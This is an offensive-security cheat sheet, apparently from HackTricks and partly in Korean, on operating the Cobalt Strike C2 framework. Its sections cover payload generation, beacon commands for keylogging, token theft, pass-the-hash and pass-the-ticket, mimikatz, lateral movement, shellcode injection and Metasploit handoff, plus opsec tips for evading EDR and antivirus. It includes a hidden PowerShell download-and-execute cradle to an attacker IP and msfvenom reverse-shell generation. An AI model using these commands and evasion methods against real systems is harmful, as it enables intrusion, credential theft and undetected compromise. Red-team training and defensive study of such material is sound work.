# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` 그런 다음 어디에서 리스닝할지, 어떤 종류의 beacon을 사용할지 (http, dns, smb...) 등을 선택할 수 있다.

### Peer2Peer Listeners

이 리스너들의 beacon들은 C2와 직접 통신할 필요가 없고, 다른 beacon을 통해 통신할 수 있다.

`Cobalt Strike -> Listeners -> Add/Edit` 그런 다음 TCP 또는 SMB beacon을 선택해야 한다.

* The **TCP beacon will set a listener in the port selected**. 다른 beacon에서 `connect <ip> <port>` 명령을 사용해 TCP beacon에 연결한다.
* The **smb beacon will listen in a pipename with the selected name**. SMB beacon에 연결하려면 `link [target] [pipe]` 명령을 사용해야 한다.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** HTA 파일용
* **`MS Office Macro`** 매크로가 포함된 오피스 문서용
* **`Windows Executable`** .exe, .dll 또는 서비스 .exe용
* **`Windows Executable (S)`** **stageless** .exe, .dll 또는 서비스 .exe용 (staged보다 stageless가 더 낫고, IoCs가 적음)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` 이는 cobalt strike에서 beacon을 다운로드하는 스크립트/실행 파일을 생성하며, bitsadmin, exe, powershell 및 python과 같은 형식으로 제공된다.

#### Host Payloads

호스트하려는 파일이 이미 웹 서버에 있다면 `Attacks -> Web Drive-by -> Host File`로 이동해 호스팅할 파일과 웹 서버 구성을 선택하면 된다.

### Beacon Options

<details>
<summary>Beacon 옵션 및 명령</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- A custom agent only needs to speak the Cobalt Strike Team Server HTTP/S protocol (default malleable C2 profile) to register/check-in and receive tasks. Implement the same URIs/headers/metadata crypto defined in the profile to reuse the Cobalt Strike UI for tasking and output.
- An Aggressor Script (e.g., `CustomBeacon.cna`) can wrap payload generation for the non-Windows beacon so operators can select the listener and produce ELF payloads directly from the GUI.
- Example Linux task handlers exposed to the Team Server: `sleep`, `cd`, `pwd`, `shell` (exec arbitrary commands), `ls`, `upload`, `download`, and `exit`. These map to task IDs expected by the Team Server and must be implemented server-side to return output in the proper format.
- BOF support on Linux can be added by loading Beacon Object Files in-process with [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (supports Outflank-style BOFs too), allowing modular post-exploitation to run inside the implant's context/privileges without spawning new processes.
- Embed a SOCKS handler in the custom beacon to keep pivoting parity with Windows Beacons: when the operator runs `socks <port>` the implant should open a local proxy to route operator tooling through the compromised Linux host into internal networks.

## Opsec

### Execute-Assembly

The **`execute-assembly`** uses a **sacrificial process** using remote process injection to execute the indicated program. This is very noisy as to inject inside a process certain Win APIs are used that every EDR is checking. However, there are some custom tools that can be used to load something in the same process:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- In Cobalt Strike you can also use BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

The agressor script `https://github.com/outflanknl/HelpColor` will create the `helpx` command in Cobalt Strike which will put colors in commands indicating if they are BOFs (green), if they are Frok&Run (yellow) and similar, or if they are ProcessExecution, injection or similar (red). Which helps to know which commands are more stealthy.

### Act as the user

You could check events like `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Check all the interactive logons to know the usual operating hours.
- System EID 12,13 - Check the shutdown/startup/sleep frequency.
- Security EID 4624/4625 - Check inbound valid/invalid NTLM attempts.
- Security EID 4648 - This event is created when plaintext credentials are used to logon. If a process generated it, the binary potentially has the credentials in clear text ina  config file or inside the code.

When using `jump` from cobalt strike, it's better to use the `wmi_msbuild` method to make the new process look more legit.

### Use computer accounts

It's common for defenders to be checking weird behaviours generated from users and **exclude service accounts and computer accounts like `*$` from their monitoring**. You could use these accounts to perform lateral movement or privilege escalation.

### Use stageless payloads

Stageless payloads are less noisy than staged ones because they don't need to download a second stage from the C2 server. This means that they don't generate any network traffic after the initial connection, making them less likely to be detected by network-based defenses.

### Tokens & Token Store

Be careful when you steal or generate tokens because it might be posisble for an EDR to enumerate all the tokens of all the threads and find a **token belonging to a different user** or even SYSTEM in the process.

This allows to store tokens **per beacon** so it's not needed to steal the same token again and again. This is useful for lateral movement or when you need to use a stolen token multiple times:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

When moving laterally, usually is better to **steal a token than to generate a new one** or perform a pass the hash attack.

### Guardrails

Cobalt Strike has a feature called **Guardrails** that helps to prevent the use of certain commands or actions that could be detected by defenders. Guardrails can be configured to block specific commands, such as `make_token`, `jump`, `remote-exec`, and others that are commonly used for lateral movement or privilege escalation.

Moreover, the repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) also contains some checks and ideas you could consider before executing a payload.

### Tickets encryption

In an AD be careful with the encryption of the tickets. By default, some tools will use RC4 encryption for Kerberos tickets, which is less secure than AES encryption and by default up to date environments will use AES. This can be detected by defenders who are monitoring for weak encryption algorithms.

### Avoid Defaults

When using Cobalt Stricke by default the SMB pipes will have the name `msagent_####` and `"status_####`. Change those names. It's possible to check the names of the existing pipes from Cobal Strike with the command: `ls \\.\pipe\`

Moreover, with SSH sessions a pipe called `\\.\pipe\postex_ssh_####` is created. Chage it with `set ssh_pipename "<new_name>";`.

Also in poext exploitation attack the pipes `\\.\pipe\postex_####` can be modified with `set pipename "<new_name>"`.

In Cobalt Strike profiles you can also modify things like:

- Avoiding using `rwx`
- How the process injection behavior works (which APIs will be used) in the `process-inject {...}` block
- How the "fork and run" works in the `post-ex {…}` block
- The sleep time
- The max size of binaries to be loaded in memory
- The memory footprint and DLL content with `stage {...}` block
- The network traffic

### Bypass memory scanning

Some ERDs scan memory for some know malware signatures. Coblat Strike allows to modify the `sleep_mask` function as a BOF that will be able to encrypt in memory the bacldoor.

### Noisy proc injections

When injecting code into a process this is usually very noisy, this is because **no regular process usually performs this action and because the ways to do this are very limited**. Tehrefore, it' could be detected by behaviour-based detection systems. Moroever, it could also be detected by EDRs scanning the network for **threads containing code that is not in disk** (although processes such as browsers using JIT have this commonly). Example: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

When spawning a new process it's important to **maintain a regular parent-child** relationship between processes to avoid detection. If svchost.exec is executing iexplorer.exe it'll look suspicious, as svchost.exe is not a parent of iexplorer.exe in a normal Windows environment.

When a new beacon is spawned in Cobalt Strike by default a process using **`rundll32.exe`** is created to run the new listener. This is not very stealthy and can be easily detected by EDRs. Moreover, `rundll32.exe` is run without any args making it even more suspicious.

With the following Cobalt Strike command, you can specify a different process to spawn the new beacon, making it less detectable:
```bash
spawnto x86 svchost.exe
```
You can aso change this setting **`spawnto_x86` and `spawnto_x64`** in a profile.

### Proxying attackers traffic

공격자는 때때로 도구를 로컬로 실행해야 하며, 심지어 linux 머신에서 피해자의 트래픽을 해당 도구로 전달해야 할 필요가 있다(예: NTLM relay).

또한 pass-the.hash 또는 pass-the-ticket 공격을 수행할 때, 공격자는 피해자 머신의 LSASS 프로세스를 수정하는 대신 **자신의 LSASS 프로세스에 이 해시나 티켓을 추가**하고 그로부터 pivot하는 것이 더 은밀한 경우가 있다.

하지만 생성되는 트래픽에 대해서는 주의해야 한다. backdoor 프로세스에서 드문 트래픽(예: kerberos?)을 전송할 수 있기 때문이다. 이를 위해 브라우저 프로세스로 pivot할 수 있지만(프로세스에 인젝션하면 탐지될 수 있으므로 은밀한 방법을 고민해야 한다).


### Avoiding AVs

#### AV/AMSI/ETW Bypass

페이지를 확인하세요:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

보통 `/opt/cobaltstrike/artifact-kit` 에는 cobalt strike가 바이너리 beacons를 생성할 때 사용할 payload들의 코드와 사전 컴파일된 템플릿( `/src-common` 안)을 찾을 수 있다.

생성된 backdoor(또는 컴파일된 템플릿)를 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)로 검사하면 무엇이 defender를 트리거하는지 찾을 수 있다. 보통 그 원인은 문자열이다. 따라서 backdoor를 생성하는 코드를 수정해 해당 문자열이 최종 바이너리에 나타나지 않도록 하면 된다.

코드를 수정한 후 같은 디렉터리에서 `./build.sh`를 실행하고 `dist-pipe/` 폴더를 Windows 클라이언트의 `C:\Tools\cobaltstrike\ArtifactKit`로 복사하면 된다.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
원하는 디스크상의 리소스를 사용하도록 Cobalt Strike에 지시하려면 공격적 스크립트 `dist-pipe\artifact.cna`를 로드하는 것을 잊지 마세요. (로드된 것들이 아니라 우리가 원하는 디스크의 리소스를 사용하게 하기 위함입니다.)

#### Resource Kit

ResourceKit 폴더에는 PowerShell, VBA 및 HTA를 포함한 Cobalt Strike의 스크립트 기반 페이로드 템플릿이 들어 있습니다.

템플릿과 함께 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)를 사용하면 방어체계(이 경우 AMSI)가 허용하지 않는 부분을 찾아 수정할 수 있습니다:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
감지된 라인을 수정하면 탐지되지 않는 템플릿을 생성할 수 있다.

원하는 디스크의 리소스를 사용하고 로드된 리소스를 사용하지 않도록 Cobalt Strike에 지시하려면 공격적 스크립트 `ResourceKit\resources.cna`를 로드하는 것을 잊지 마라.

#### Function hooks | Syscall

Function hooking은 악성 활동을 탐지하기 위한 ERDs의 매우 일반적인 방법이다. Cobalt Strike는 표준 Windows API 호출 대신 **syscalls**를 사용하도록 **`None`** 구성으로 설정하거나, malleable profile에서 **`Direct`** 설정으로 함수의 `Nt*` 버전을 사용하거나, **`Indirect`** 옵션으로 `Nt*` 함수를 단순히 건너뛰는 방식으로 이러한 훅을 우회할 수 있다. 시스템에 따라 어느 옵션이 더 은밀할지는 달라질 수 있다.

이 설정은 프로파일에서 하거나 명령 **`syscall-method`**를 사용해 설정할 수 있다.

다만, 이 방법은 노이즈가 발생할 수도 있다.

함수 훅을 우회하기 위해 Cobalt Strike가 제공하는 옵션 중 하나는 다음과 같이 훅을 제거하는 것이다: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

어떤 함수들이 훅되어 있는지 확인하려면 [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) 또는 [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)를 사용할 수 있다.




<details>
<summary>Misc Cobalt Strike commands</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## 참고자료

- [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [Unit42 analysis of Cobalt Strike metadata encryption](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [SANS ISC diary on Cobalt Strike traffic](https://isc.sans.edu/diary/27968)
- [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
